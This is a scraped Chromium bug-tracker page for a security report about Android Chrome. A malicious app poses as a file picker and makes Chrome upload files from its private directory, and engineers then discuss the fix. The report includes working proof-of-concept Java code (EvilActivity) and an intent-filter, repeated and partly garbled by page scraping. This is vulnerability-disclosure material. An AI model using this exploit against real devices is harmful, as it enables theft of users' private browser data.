        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

            Issue 1189092: Security: Steal arbitrary data in Android chrome private directory
          <h1>
            
            Issue 1189092: Security: Steal arbitrary data in Android chrome private directory
          </h1>
          
            Reported by
            
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>
      zyzen...@gmail.com<a id="user-link" href="/u/2257024693" title="zyzen...@gmail.com"><!---->zyzen...@gmail.com<!----></a>
      zyzen...@gmail.com<span id="user-text" hidden=""><!---->zyzen...@gmail.com<!----></span>
      <div id="availability-text" class="availability-notice" title="undefined" hidden=""><!----><!----></div>
    <mr-user-link aria-label="issue reporter"></mr-user-link>
            on 
      Wed, Mar 17, 2021, 5:13 AM EDT
    <chops-timestamp title="Wed, Mar 17, 2021, 5:13 AM EDT"></chops-timestamp>
            
          <small class="byline">
            Reported by
            <mr-user-link aria-label="issue reporter"></mr-user-link>
            on <chops-timestamp title="Wed, Mar 17, 2021, 5:13 AM EDT"></chops-timestamp>
            
          </small>
        <div class="main-text">
          <h1>
            
            Issue 1189092: Security: Steal arbitrary data in Android chrome private directory
          </h1>
          <small class="byline">
            Reported by
            <mr-user-link aria-label="issue reporter"></mr-user-link>
            on <chops-timestamp title="Wed, Mar 17, 2021, 5:13 AM EDT"></chops-timestamp>
            
          </small>
        </div>
      <div class="main-text-outer">
        <div class="main-text">
          <h1>
            
            Issue 1189092: Security: Steal arbitrary data in Android chrome private directory
          </h1>
          <small class="byline">

      Steps to reproduce the problem:<span class="line"><!---->Steps to reproduce the problem:<!----></span><br>1.Install the poc app "setresultcontactphotocrop" in your android device<span class="line"><!---->1.Install the poc app "setresultcontactphotocrop" in your android device<!----></span><br>```EvilActivity```<span class="line"><!---->```EvilActivity```<!----></span><br>public class EvilActivity extends AppCompatActivity {<span class="line"><!---->public class EvilActivity extends AppCompatActivity {<!----></span><br>    final static String PRIVATE_URI = "file:///data/data/com.chrome.canary/app_tabs/0/tab697";<span class="line"><!---->    final static String PRIVATE_URI = "file:///data/data/com.chrome.canary/app_tabs/0/tab697";<!----></span><br><br>    @Override<span class="line"><!---->    @Override<!----></span><br>    protected void onCreate(@Nullable Bundle savedInstanceState) {<span class="line"><!---->    protected void onCreate(@Nullable Bundle savedInstanceState) {<!----></span><br>        super.onCreate(savedInstanceState);<span class="line"><!---->        super.onCreate(savedInstanceState);<!----></span><br>        setContentView(R.layout.activity_main);<span class="line"><!---->        setContentView(R.layout.activity_main);<!----></span><br><br>        Log.d("user", "EvilActivity started!");<span class="line"><!---->        Log.d("user", "EvilActivity started!");<!----></span><br>        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));<span class="line"><!---->        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));<!----></span><br>        finish();<span class="line"><!---->        finish();<!----></span><br><br>    }<span class="line"><!---->    }<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>```intent-filter```<span class="line"><!---->```intent-filter```<!----></span><br>  <activity android:name=".EvilActivity" ><span class="line"><!---->  &lt;activity android:name=".EvilActivity" &gt;<!----></span><br>             <intent-filter android:priority="100"><span class="line"><!---->             &lt;intent-filter android:priority="100"&gt;<!----></span><br>                 <action android:name="android.intent.action.GET_CONTENT"/><span class="line"><!---->                 &lt;action android:name="android.intent.action.GET_CONTENT"/&gt;<!----></span><br>                 <category android:name="android.intent.category.DEFAULT"/><span class="line"><!---->                 &lt;category android:name="android.intent.category.DEFAULT"/&gt;<!----></span><br>                 <data android:mimeType="*/*"/><span class="line"><!---->                 &lt;data android:mimeType="*/*"/&gt;<!----></span><br>             </intent-filter><span class="line"><!---->             &lt;/intent-filter&gt;<!----></span><br>        </activity><span class="line"><!---->        &lt;/activity&gt;<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>2.listening port 2333 in local server(my ip is 192.168.1.199)<span class="line"><!---->2.listening port 2333 in local server(my ip is 192.168.1.199)<!----></span><br><br>3.visit f.html via chrome, click choose file button and choose file mananger, choose the poc app "setresultcontactphotocrop"<span class="line"><!---->3.visit f.html via chrome, click choose file button and choose file mananger, choose the poc app "setresultcontactphotocrop"<!----></span><br><br>4. you will find out that the data in Android chrome private directory "/data/data/com.chrome/canary" is upload to my server(I use /app_tabs/0/tab697 for proof, there are many config files in Android chrome private directory)<span class="line"><!---->4. you will find out that the data in Android chrome private directory "/data/data/com.chrome/canary" is upload to my server(I use /app_tabs/0/tab697 for proof, there are many config files in Android chrome private directory)<!----></span><br><br>What is the expected behavior?<span class="line"><!---->What is the expected behavior?<!----></span><br>user cannot read the data in Android chrome private directory<span class="line"><!---->user cannot read the data in Android chrome private directory<!----></span><br><br>What went wrong?<span class="line"><!---->What went wrong?<!----></span><br>The data in Android chrome private directory is read and upload to third-party server<span class="line"><!---->The data in Android chrome private directory is read and upload to third-party server<!----></span><br><br>Did this work before? N/A <span class="line"><!---->Did this work before? N/A <!----></span><br><br>Chrome version: 91.0.4435.3  Channel: n/a<span class="line"><!---->Chrome version: 91.0.4435.3  Channel: n/a<!----></span><br>OS Version: <span class="line"><!---->OS Version: <!----></span><br>Flash Version:<span class="line"><!---->Flash Version:<!----></span><mr-comment-content></mr-comment-content>

      </div>
    
      
        
        
      
        The root cause is an attacker can hijacking android.intent.action.GET_CONTENT to fake a file manager, if victim choose it for picking files, the data in Android chrome private directory will be stealing.<span class="line"><!---->The root cause is an attacker can hijacking android.intent.action.GET_CONTENT to fake a file manager, if victim choose it for picking files, the data in Android chrome private directory will be stealing.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

          <a class="comment-link" href="?id=1189092#c5">Comment 5<!----></a>

          
        by
        <mr-user-link></mr-user-link>

        Hi thanks for your triaged, I think this is not a AOSP bug, any applications can register this intent-filter for faking a file picker, but the root cause is that chrome doesn't check the upload file's inputUri(localpath), if it is private directory path, chrome cannot read and upload it, I'm also test Google Drive upload function, my poc application "setresultcontactphotocrop" was also listed in the file pickers select list, but we cannot upload the private files to cloud drive.<span class="line"><!---->Hi thanks for your triaged, I think this is not a AOSP bug, any applications can register this intent-filter for faking a file picker, but the root cause is that chrome doesn't check the upload file's inputUri(localpath), if it is private directory path, chrome cannot read and upload it, I'm also test Google Drive upload function, my poc application "setresultcontactphotocrop" was also listed in the file pickers select list, but we cannot upload the private files to cloud drive.<!----></span><br><br>By the way, I have report this bug to yandex and opera, they have confirm this issue.<span class="line"><!---->By the way, I have report this bug to yandex and opera, they have confirm this issue.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        <mr-comment-content></mr-comment-content>

      </div><br>
    
        
      
        Capturing some email discussion:<span class="line"><!---->Capturing some email discussion:<!----></span><br><br>I agree there is a Chrome bug here. I wasn't sure if there was a framework issue too, though, because ACTION_GET_CONTENT's documentation [1] says, "Output: The URI of the item that was picked. This **must** be a content: URI so that any receiver can access it" (emphasis mine).<span class="line"><!---->I agree there is a Chrome bug here. I wasn't sure if there was a framework issue too, though, because ACTION_GET_CONTENT's documentation [1] says, "Output: The URI of the item that was picked. This **must** be a content: URI so that any receiver can access it" (emphasis mine).<!----></span><br><br>But, Will pointed pointed out that "Even if the framework were to try and enforce that I think that is orthogonal from potential security issues; there are still scenarios where a malicious app could return a URI that results in a possible security bug if not handled properly by the receiving app. For example, a malicious app could return a content URI that points to a non-exported content provider in the receiving app."<span class="line"><!---->But, Will pointed pointed out that "Even if the framework were to try and enforce that I think that is orthogonal from potential security issues; there are still scenarios where a malicious app could return a URI that results in a possible security bug if not handled properly by the receiving app. For example, a malicious app could return a content URI that points to a non-exported content provider in the receiving app."<!----></span><br><br>It looks like the SelectFileDialog.java already tries to protect against uploading private data files in some cases [2], but that same check is not applied [3] when converting a CONTENT_SCHEME’s data to FILE_SCHEME. I think we’d also want to add a similar check when processing the result of the ACTION_IMAGE_CAPTURE [4].<span class="line"><!---->It looks like the SelectFileDialog.java already tries to protect against uploading private data files in some cases [2], but that same check is not applied [3] when converting a CONTENT_SCHEME’s data to FILE_SCHEME. I think we’d also want to add a similar check when processing the result of the ACTION_IMAGE_CAPTURE [4].<!----></span><br><br>And so also probably want to take Will’s point and verify that any CONTENT_SCHEME data aren’t coming from a non-exported component of Chrome.<span class="line"><!---->And so also probably want to take Will’s point and verify that any CONTENT_SCHEME data aren’t coming from a non-exported component of Chrome.<!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://developer.android.com/reference/android/content/Intent#ACTION_GET_CONTENT<a class="undefined" target="_blank" href="https://developer.android.com/reference/android/content/Intent#ACTION_GET_CONTENT"><!---->https://developer.android.com/reference/android/content/Intent#ACTION_GET_CONTENT<!----></a><br>[2] <span class="line"><!---->[2] <!----></span>https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=866;drc=5d60ceec700919b12597ce94c8496e087162c5c7<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=866;drc=5d60ceec700919b12597ce94c8496e087162c5c7"><!---->https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=866;drc=5d60ceec700919b12597ce94c8496e087162c5c7<!----></a><br>[3] <span class="line"><!---->[3] <!----></span>https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=908;drc=5d60ceec700919b12597ce94c8496e087162c5c7<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=908;drc=5d60ceec700919b12597ce94c8496e087162c5c7"><!---->https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=908;drc=5d60ceec700919b12597ce94c8496e087162c5c7<!----></a><br>[4] <span class="line"><!---->[4] <!----></span>https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=638;drc=5d60ceec700919b12597ce94c8496e087162c5c7<a         Hi, maybe this is a webview framework issue too, developers who using webview always forget to limit the localpath of uploading files in their applications, so I think we could limit the localpath of upload feature to /sdcard or exclude this directory /data/data/ in webview to help developers mitigate this case.<span class="line"><!---->Hi, maybe this is a webview framework issue too, developers who using webview always forget to limit the localpath of uploading files in their applications, so I think we could limit the localpath of upload feature to /sdcard or exclude this directory /data/data/ in webview to help developers mitigate this case.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        yeah, I know uploading files from the Downloads folder is a legitimate use-case.<span class="line"><!---->yeah, I know uploading files from the Downloads folder is a legitimate use-case.<!----></span><br><br>if user choose /sdcard/Downloads himself, it's indeed no problem, but when user click the third-party file manager app, he/she doesn't know it points to content://media/external/downloads/[num], this will allow the data downloaded by the user to be leaked.<span class="line"><!---->if user choose /sdcard/Downloads himself, it's indeed no problem, but when user click the third-party file manager app, he/she doesn't know it points to content://media/external/downloads/[num], this will allow the data downloaded by the user to be leaked.<!----></span><br><br>so I think we shouldn't allow the protocol "content://" in here.<span class="line"><!---->so I think we shouldn't allow the protocol "content://" in here.<!----></span><mr-comment-content></mr-comment-content>

          Comment 37<a class="comment-link" href="?id=1189092#c37">Comment 37<!----></a>

          
        by
        
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>
      qin...@chromium.org<a id="user-link" href="/u/951229368" title="qin...@chromium.org"><!---->qin...@chromium.org<!----></a>
      qin...@chromium.org<span id="user-text" hidden=""><!---->qin...@chromium.org<!----></span>
      <div id="availability-text" class="availability-notice" title="undefined" hidden=""><!----><!----></div>
    <mr-user-link></mr-user-link>
        on
        
      Mon, Apr 19, 2021, 1:08 PM EDT
    <chops-timestamp title="Mon, Apr 19, 2021, 1:08 PM EDT"></chops-timestamp>
        
      
        <div>
          <a class="comment-link" href="?id=1189092#c37">Comment 37<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Mon, Apr 19, 2021, 1:08 PM EDT"></chops-timestamp>
        
      
        </div>
        
      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1189092#c37">Comment 37<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Mon, Apr 19, 2021, 1:08 PM EDT"></chops-timestamp>
        
      
        </div>
        
      </div>
    
      
        
        
      
        Why content://media/external/downloads/xxx cannot be leaked?  The content://media/external/downloads/xxx  is  in the public MediaStore, and Chrome grants other apps to read those content URIs when it downloads the file.  Android has better permission controls on content URIs than file URIs. <span class="line"><!---->Why content://media/external/downloads/xxx cannot be leaked?  The content://media/external/downloads/xxx  is  in the public MediaStore, and Chrome grants other apps to read those content URIs when it downloads the file.  Android has better permission controls on content URIs than file URIs. <!----></span><br><br>So if a user is using a third-party file manager app, the third-party file manager app can actually read the files in content://media/external/downloads/ by itself and upload them. And it doesn't need to involve select file dialog in Chrome. It is the same for file:/// if user is using an external sd card for download locations.<span class="line"><!---->So if a user is using a third-party file manager app, the third-party file manager app can actually read the files in content://media/external/downloads/ by itself and upload them. And it doesn't need to involve select file dialog in Chrome. It is the same for file:/// if user is using an external sd card for download locations.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>
    
      
    <mr-comment headinglevel="2"></mr-comment>

        If the Downloads/ folder is the only concern then I think it is time to close this bug, given what qinmin@ said.<span class="line"><!---->If the Downloads/ folder is the only concern then I think it is time to close this bug, given what qinmin@ said.<!----></span><br><br>But before we do, can a content:// URI be constructed to point to the chrome private data directory?<span class="line"><!---->But before we do, can a content:// URI be constructed to point to the chrome private data directory?<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>

          <a class="comment-link" href="?id=1189092#c40">Comment 40<!----></a>

          
        by
        <mr-user-link></mr-user-link>

        <chops-timestamp title="Tue, Apr 20, 2021, 12:43 PM EDT"></chops-timestamp>

      </div>
    
      
        
        
      
        regarding #38, Chrome has fileProviders that can generate content URI and grant access to files.  Offline page, for example, use this to generate content URIs for offline pages. Download also uses it to generate content URIs for files on EXTERNAL sdcard. But all the use cases are limited to a small set of files. So If any one misbehaves, it is up to the corresponding team to determine whether the URI access is valid.<span class="line"><!---->regarding #38, Chrome has fileProviders that can generate content URI and grant access to files.  Offline page, for example, use this to generate content URIs for offline pages. Download also uses it to generate content URIs for files on EXTERNAL sdcard. But all the use cases are limited to a small set of files. So If any one misbehaves, it is up to the corresponding team to determine whether the URI access is valid.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

          <strong><!---->Labels:</strong>
          
          -Merge-Request-91 Hotlist-Merge-Review Merge-Review-91
          
          <br>
        <!---->
        
      </div><br>
    
        
      
        This bug requires manual review: M91's targeted beta branch promotion date has already passed, so this requires manual review<span class="line"><!---->This bug requires manual review: M91's targeted beta branch promotion date has already passed, so this requires manual review<!----></span><br>Before a merge request will be considered, the following information is required to be added to this bug:<span class="line"><!---->Before a merge request will be considered, the following information is required to be added to this bug:<!----></span><br><br>1. Does your merge fit within the Merge Decision Guidelines?<span class="line"><!---->1. Does your merge fit within the Merge Decision Guidelines?<!----></span><br>- Chrome: <span class="line"><!---->- Chrome: <!----></span>https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge"><!---->https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge<!----></a><br>- Chrome OS: <span class="line"><!---->- Chrome OS: <!----></span>https://goto.google.com/cros-release-branch-merge-guidelines<a class="undefined" target="_blank" href="https://goto.google.com/cros-release-branch-merge-guidelines"><!---->https://goto.google.com/cros-release-branch-merge-guidelines<!----></a><br>2. Links to the CLs you are requesting to merge.<span class="line"><!---->2. Links to the CLs you are requesting to merge.<!----></span><br>3. Has the change landed and been verified on ToT?<span class="line"><!---->3. Has the change landed and been verified on ToT?<!----></span><br>4. Does this change need to be merged into other active release branches (M-1, M+1)?<span class="line"><!---->4. Does this change need to be merged into other active release branches (M-1, M+1)?<!----></span><br>5. Why are these changes required in this milestone after branch?<span class="line"><!---->5. Why are these changes required in this milestone after branch?<!----></span><br>6. Is this a new feature?<span class="line"><!---->6. Is this a new feature?<!----></span><br>7. If it is a new feature, is it behind a flag using finch?<span class="line"><!---->7. If it is a new feature, is it behind a flag using finch?<!----></span><br><br>Chrome OS Only:<span class="line"><!---->Chrome OS Only:<!----></span><br>8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: <span class="line"><!---->8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: <!----></span>http://go/cros-engprodcomponents<a class="undefined" target="_blank" href="http://go/cros-engprodcomponents"><!---->http://go/cros-engprodcomponents<!----></a><br><br>Please contact the milestone owner if you have questions.<span class="line"><!---->Please contact the milestone owner if you have questions.<!----></span><br>Owners: benmason@(Android), bindusuvarna@(iOS), kbleicher@(ChromeOS), pbommana@(Desktop)<span class="line"><!---->Owners: benmason@(Android), bindusuvarna@(iOS), kbleicher@(ChromeOS), pbommana@(Desktop)<!----></span><br><br>For more details visit <span class="line"><!---->For more details visit <!----></span>https://www.chromium.org/issue-tracking/autotriage<a class="undefined" target="_blank" href="https://www.chromium.org/issue-tracking/autotriage"><!---->https://www.chromium.org/issue-tracking/autotriage<!----></a> - Your friendly Sheriffbot<span class="line"><!----> - Your friendly Sheriffbot<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products.         Steps to reproduce the problem:<span class="line"><!---->Steps to reproduce the problem:<!----></span><br>1.Install the poc app "setresultcontactphotocrop" in your android device<span class="line"><!---->1.Install the poc app "setresultcontactphotocrop" in your android device<!----></span><br>```EvilActivity```<span class="line"><!---->```EvilActivity```<!----></span><br>public class EvilActivity extends AppCompatActivity {<span class="line"><!---->public class EvilActivity extends AppCompatActivity {<!----></span><br>    final static String PRIVATE_URI = "file:///data/data/com.chrome.canary/app_tabs/0/tab697";<span class="line"><!---->    final static String PRIVATE_URI = "file:///data/data/com.chrome.canary/app_tabs/0/tab697";<!----></span><br><br>    @Override<span class="line"><!---->    @Override<!----></span><br>    protected void onCreate(@Nullable Bundle savedInstanceState) {<span class="line"><!---->    protected void onCreate(@Nullable Bundle savedInstanceState) {<!----></span><br>        super.onCreate(savedInstanceState);<span class="line"><!---->        super.onCreate(savedInstanceState);<!----></span><br>        setContentView(R.layout.activity_main);<span class="line"><!---->        setContentView(R.layout.activity_main);<!----></span><br><br>        Log.d("user", "EvilActivity started!");<span class="line"><!---->        Log.d("user", "EvilActivity started!");<!----></span><br>        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));<span class="line"><!---->        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));<!----></span><br>        finish();<span class="line"><!---->        finish();<!----></span><br><br>    }<span class="line"><!---->    }<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>```intent-filter```<span class="line"><!---->```intent-filter```<!----></span><br>  <activity android:name=".EvilActivity" android:priority="100"&gt;<!----></span><br>                 <action android:name="android.intent.action.GET_CONTENT"/><span class="line"><!---->                 &lt;action      &lt;/activity&gt;<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>2.listening port 2333 in local server(my ip is 192.168.1.199)<span class="line"><!---->2.listening port 2333 in local server(my ip is 192.168.1.199)<!----></span><br><br>3.visit f.html via chrome, click choose file button and choose file mananger, choose the poc app "setresultcontactphotocrop"<span class="line"><!---->3.visit f.html via chrome, click choose file button and choose file mananger, choose the poc app "setresultcontactphotocrop"<!----></span><br><br>4. you will find out that the data in Android chrome private directory "/data/data/com.chrome/canary" is upload to my server(I use /app_tabs/0/tab697 for proof, there are many config files in Android chrome private directory)<span class="line"><!---->4. you will find out that the data in Android chrome private directory "/data/data/com.chrome/canary" is upload to my server(I use /app_tabs/0/tab697 for proof, there are many config files in Android chrome private directory)<!----></span><br><br>What is the expected behavior?<span class="line"><!---->What is the expected behavior?<!----></span><br>user cannot read the data            issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.

          position: relative;

        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.

          border-spacing: 0;
          border-collapse: collapse;

           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }

          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;

            close<i class="material-icons">close</i>

            <i class="material-icons">close</i>
          </button>

          <span>Blocked on issues</span>

          </button>

      <chops-dialog closeonoutsideclick="">

          </button>

          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {

            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
